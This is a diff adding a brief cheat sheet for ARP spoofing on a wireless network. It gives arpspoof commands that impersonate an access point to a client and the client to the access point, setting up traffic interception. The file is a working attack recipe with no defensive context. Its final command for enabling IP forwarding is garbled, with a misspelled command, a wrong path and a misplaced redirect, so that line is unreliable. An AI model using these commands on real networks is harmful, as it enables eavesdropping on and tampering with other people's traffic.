@@ -1,0 +1,13 @@
+: ARP spoofing :
+
+: To pretend the ap that iam client:
+
+arpspoof -i wlan0 -t [client ip] [ap-ip]
+
+: To prtend the client that iam ap :
+
+arpspoof -i wlan0 -t [ap-ip] [client ip]
+
+: Command to enable packet forwarding without drop 
+:
+ech >1 /proc.sys/net/epv4/ip_forward 
